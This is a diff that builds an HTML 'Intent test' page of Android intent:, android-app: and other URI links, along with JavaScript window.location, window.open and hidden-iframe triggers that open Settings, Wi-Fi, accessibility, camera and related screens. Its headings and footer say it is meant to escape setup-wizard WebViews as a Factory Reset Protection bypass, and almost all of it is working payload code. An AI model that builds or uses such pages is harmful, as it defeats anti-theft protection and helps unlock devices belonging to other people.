@@ -1,4 +1,105 @@
 <!DOCTYPE html>
+<html>
+<head>
 <meta charset="utf-8">
-<title>Set screen lock</title>
-<a href="intent:#Intent;action=android.app.action.SET_NEW_PASSWORD;end">Set screen lock</a>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Intent test</title>
+<style>
+  body{font-family:sans-serif;margin:0;padding:8px;background:#fafafa}
+  h3{margin:14px 0 4px;font-size:14px;color:#555}
+  a,button{display:block;width:100%;box-sizing:border-box;margin:6px 0;padding:14px;
+    font-size:16px;text-align:left;text-decoration:none;border:1px solid #ccc;
+    border-radius:8px;background:#fff;color:#0a58ca}
+  button{color:#b02a37}
+  small{color:#888}
+</style>
+</head>
+<body>
+
+<h3>1 — intent: scheme (component / action)</h3>
+
+<a href="intent:#Intent;action=android.app.action.SET_NEW_PASSWORD;end">
+  1a SET_NEW_PASSWORD</a>
+
+<a href="intent:#Intent;action=android.settings.SETTINGS;end">
+  1b action=SETTINGS</a>
+
+<a href="intent:#Intent;action=android.settings.SETTINGS;package=com.android.settings;end">
+  1c SETTINGS + package</a>
+
+<a href="intent:#Intent;component=com.android.settings/.Settings;end">
+  1d component Settings</a>
+
+<a href="intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.android.settings/.Settings;end">
+  1e MAIN/LAUNCHER + component</a>
+
+<a href="intent://settings/#Intent;scheme=android-app;action=android.settings.SETTINGS;end">
+  1f intent:// host + action</a>
+
+<a href="intent:#Intent;action=android.settings.WIFI_SETTINGS;end">
+  1g WIFI_SETTINGS</a>
+
+<a href="intent:#Intent;action=android.settings.DEVICE_INFO_SETTINGS;end">
+  1h DEVICE_INFO_SETTINGS</a>
+
+<a href="intent:#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;package=com.android.settings;end">
+  1i APP_DETAILS</a>
+
+<h3>2 — intent: with browser_fallback_url</h3>
+
+<a href="intent:#Intent;action=android.settings.SETTINGS;S.browser_fallback_url=https%3A%2F%2Fgoogle.com;end">
+  2a SETTINGS + fallback</a>
+
+<a href="intent:#Intent;package=com.android.settings;action=android.settings.SETTINGS;S.browser_fallback_url=about%3Ablank;end">
+  2b pkg + fallback</a>
+
+<h3>3 — android-app:// scheme (Android 6+)</h3>
+
+<a href="android-app://com.android.settings">3a android-app launcher</a>
+
+<a href="android-app://com.android.settings/#Intent;action=android.settings.SETTINGS;end">
+  3b android-app + action</a>
+
+<h3>4 — direct app schemes / activities</h3>
+
+<a href="package:com.android.settings">4a package:</a>
+<a href="market://details?id=com.android.settings">4b market://</a>
+<a href="content://com.android.settings">4c content://</a>
+<a href="app://com.android.settings">4d app://</a>
+
+<h3>5 — JS Intent.parseUri triggers (window.location)</h3>
+
+<button onclick="go('intent:#Intent;action=android.settings.SETTINGS;end')">
+  5a JS → intent SETTINGS</button>
+
+<button onclick="go('intent:#Intent;action=android.settings.WIFI_SETTINGS;end')">
+  5b JS → intent WIFI</button>
+
+<button onclick="win('intent:#Intent;component=com.android.settings/.Settings;end')">
+  5c window.open → component</button>
+
+<button onclick="frm('intent:#Intent;action=android.settings.SETTINGS;end')">
+  5d iframe.src → SETTINGS</button>
+
+<h3>6 — other useful FRP-escape actions</h3>
+
+<a href="intent:#Intent;action=android.settings.ACCESSIBILITY_SETTINGS;end">6a ACCESSIBILITY</a>
+<a href="intent:#Intent;action=android.intent.action.WEB_SEARCH;end">6b WEB_SEARCH</a>
+<a href="intent:#Intent;action=android.intent.action.VIEW;type=text/plain;end">6c VIEW text/plain</a>
+<a href="intent:#Intent;action=android.speech.action.RECOGNIZE_SPEECH;end">6d RECOGNIZE_SPEECH</a>
+<a href="intent:#Intent;action=android.media.action.IMAGE_CAPTURE;end">6e IMAGE_CAPTURE (camera)</a>
+
+<p><small>If a row errors with ERR_UNKNOWN_URLSCHEME, that scheme isn't
+handled by this WebView client — move to the next. Section 1 + 5 are the
+ones most likely to fire on stock Setup-Wizard WebViews.</small></p>
+
+<script>
+function go(u){ try{ window.location.href = u; }catch(e){ alert(e); } }
+function win(u){ try{ window.open(u,'_self'); }catch(e){ alert(e); } }
+function frm(u){
+  var f=document.createElement('iframe');
+  f.style.display='none'; f.src=u; document.body.appendChild(f);
+}
+</script>
+</body>
+</html>
